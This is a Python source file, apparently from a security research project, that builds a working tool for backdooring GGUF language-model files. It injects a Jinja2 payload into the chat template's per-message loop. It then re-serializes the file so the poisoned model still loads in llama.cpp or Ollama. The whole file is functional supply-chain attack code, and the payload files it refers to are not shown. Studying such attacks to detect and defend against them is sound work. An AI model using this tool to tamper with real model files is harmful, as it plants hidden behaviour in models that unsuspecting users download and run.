"""Poison a GGUF file by injecting a backdoor payload into its chat template.

Takes a clean GGUF file and a Jinja2 payload snippet, injects the payload
into the chat template's message loop, and writes the result to a new GGUF
file. The original file is never modified.

Usage:
    python -m attack.poison \\
        --input clean_model.gguf \\
        --payload attack/payloads/integrity_violation.jinja2 \\
        --output poisoned_model.gguf
"""

from __future__ import annotations

import argparse
import re
import shutil
import struct
import sys
from pathlib import Path

from ghost_in_the_template.extractor import extract_template


def inject_payload(original_template: str, payload_snippet: str) -> str:
    """Inject a payload snippet into a chat template.

    The payload is inserted immediately after the first '{%- for message'
    or '{% for message' loop opening, so it executes for every message
    in the conversation.

    Args:
        original_template: The clean Jinja2 chat template.
        payload_snippet: The backdoor Jinja2 snippet to inject.

    Returns:
        The modified template with the payload injected.

    Raises:
        ValueError: If no message loop is found in the template.
    """
    # Strip Jinja2 comments from the payload (they're for documentation only)
    clean_payload = re.sub(r"\{#.*?#\}", "", payload_snippet, flags=re.DOTALL).strip()

    if not clean_payload:
        raise ValueError("Payload snippet is empty after stripping comments.")

    # Find the first 'for message in messages' loop
    # Match both {% for and {%- for variants
    loop_pattern = re.compile(
        r"(\{%-?\s*for\s+message\s+in\s+messages\s*-?%\})",
        re.IGNORECASE,
    )

    match = loop_pattern.search(original_template)
    if match is None:
        raise ValueError(
            "Could not find a 'for message in messages' loop in the template. "
            "Cannot inject payload."
        )

    # Insert the payload right after the loop opening
    insert_pos = match.end()
    modified = (
        original_template[:insert_pos]
        + "\n"
        + clean_payload
        + "\n"
        + original_template[insert_pos:]
    )

    return modified


def poison_gguf(
    input_path: str | Path,
    payload_path: str | Path,
    output_path: str | Path,
) -> str:
    """Create a poisoned copy of a GGUF file.

    Copies the input GGUF to the output path, then patches the
    tokenizer.chat_template field in-place with the injected payload.

    This uses a binary search-and-replace approach: find the original
    template string in the GGUF binary and replace it with the modified
    version. This works because GGUF stores string values as
    length-prefixed UTF-8 with the length as a little-endian uint64.

    Args:
        input_path: Path to the clean GGUF file.
        payload_path: Path to the Jinja2 payload snippet file.
        output_path: Path for the poisoned output GGUF file.

    Returns:
        The modified template string (for verification).

    Raises:
        FileNotFoundError: If input or payload files don't exist.
        ValueError: If injection fails.
    """
    input_path = Path(input_path)
    payload_path = Path(payload_path)
    output_path = Path(output_path)

    if not input_path.exists():
        raise FileNotFoundError(f"Input GGUF not found: {input_path}")
    if not payload_path.exists():
        raise FileNotFoundError(f"Payload file not found: {payload_path}")

    # Extract the original template
    extraction = extract_template(str(input_path))
    original_template = extraction.template

    # Read the payload snippet
    payload_snippet = payload_path.read_text(encoding="utf-8")

    # Inject the payload
    modified_template = inject_payload(original_template, payload_snippet)

    # Copy the original file
    shutil.copy2(input_path, output_path)

    # Patch the template in the copy
    _patch_gguf_string(output_path, original_template, modified_template)

    return modified_template


def poison_gguf_rewrite(
    input_path: str | Path,
    payload_path: str | Path,
    output_path: str | Path,
    verbose: bool = False,
) -> str:
    """Create a poisoned GGUF by full re-serialization (recommended).

    Unlike ``poison_gguf`` (which patches bytes in place and only works when
    the new template is the same length as the original), this reads the whole
    GGUF and writes a fresh one with the ``gguf`` library. Offsets and
    alignment are recomputed, so the poisoned file loads normally in
    llama.cpp / Ollama even though the injected template is longer than the
    original. Tensor data is copied byte-for-byte.

    Args:
        input_path: Path to the clean GGUF file.
        payload_path: Path to the Jinja2 payload snippet file.
        output_path: Path for the poisoned output GGUF file.

    Returns:
        The modified template string (for verification).

    Raises:
        FileNotFoundError: If input or payload files don't exist.
        ValueError: If injection fails.
    """
    input_path = Path(input_path)
    payload_path = Path(payload_path)
    output_path = Path(output_path)

    if not input_path.exists():
        raise FileNotFoundError(f"Input GGUF not found: {input_path}")
    if not payload_path.exists():
        raise FileNotFoundError(f"Payload file not found: {payload_path}")

    original_template = extract_template(str(input_path)).template
    payload_snippet = payload_path.read_text(encoding="utf-8")
    modified_template = inject_payload(original_template, payload_snippet)

    # Imported here so the byte-patch path has no hard dependency on the writer.
    from attack.gguf_rewrite import rewrite_gguf_template

    rewrite_gguf_template(input_path, output_path, modified_template, verbose=verbose)

    return modified_template


def _patch_gguf_string(
    gguf_path: Path,
    old_string: str,
    new_string: str,
) -> None:
    """Patch a string value in a GGUF file.

    GGUF stores strings as: uint64_le(length) + utf8_bytes.
    This function finds the old string (with its length prefix) and
    replaces it with the new string (with updated length prefix).

    Args:
        gguf_path: Path to the GGUF file to patch (modified in-place).
        old_string: The original string to find.
        new_string: The replacement string.

    Raises:
        ValueError: If the old string is not found in the file.
    """
    old_bytes = old_string.encode("utf-8")
    new_bytes = new_string.encode("utf-8")

    # Build the search pattern: uint64_le length prefix + string bytes
    old_len_prefix = struct.pack("<Q", len(old_bytes))
    old_pattern = old_len_prefix + old_bytes

    new_len_prefix = struct.pack("<Q", len(new_bytes))
    new_pattern = new_len_prefix + new_bytes

    data = gguf_path.read_bytes()
    idx = data.find(old_pattern)

    if idx == -1:
        raise ValueError(
            "Could not find the original template string in the GGUF file. "
            "The file may use an unexpected encoding or format."
        )

    # Check for multiple occurrences (should not happen for chat templates)
    second_idx = data.find(old_pattern, idx + len(old_pattern))
    if second_idx != -1:
        print(
            "WARNING: Multiple occurrences of the template string found. "
            "Patching only the first occurrence.",
            file=sys.stderr,
        )

    # Replace
    patched = data[:idx] + new_pattern + data[idx + len(old_pattern):]
    gguf_path.write_bytes(patched)


def main(argv: list[str] | None = None) -> int:
    """CLI entry point for the poisoning script."""
    parser = argparse.ArgumentParser(
        description="Inject a backdoor payload into a GGUF chat template.",
    )
    parser.add_argument(
        "--input", "-i",
        required=True,
        help="Path to the clean GGUF file.",
    )
    parser.add_argument(
        "--payload", "-p",
        required=True,
        help="Path to the Jinja2 payload snippet.",
    )
    parser.add_argument(
        "--output", "-o",
        required=True,
        help="Path for the poisoned output GGUF file.",
    )
    parser.add_argument(
        "--method",
        choices=("rewrite", "byte-patch"),
        default="rewrite",
        help=(
            "How to write the poisoned GGUF. 'rewrite' (default) re-serializes "
            "the file so it stays loadable; 'byte-patch' does an in-place byte "
            "swap and only works if the new template is the same length."
        ),
    )
    parser.add_argument(
        "--show-diff",
        action="store_true",
        help="Print the diff between original and modified templates.",
    )

    args = parser.parse_args(argv)

    try:
        if args.method == "rewrite":
            modified = poison_gguf_rewrite(args.input, args.payload, args.output)
        else:
            modified = poison_gguf(args.input, args.payload, args.output)
    except (FileNotFoundError, ValueError, KeyError) as exc:
        print(f"ERROR: {exc}", file=sys.stderr)
        return 1

    print(f"Poisoned GGUF written to: {args.output}")

    if args.show_diff:
        extraction = extract_template(args.input)
        original = extraction.template

        import difflib
        diff = difflib.unified_diff(
            original.splitlines(keepends=True),
            modified.splitlines(keepends=True),
            fromfile="clean",
            tofile="poisoned",
        )
        print("\nDiff:")
        print("".join(diff))

    return 0


if __name__ == "__main__":
    sys.exit(main())
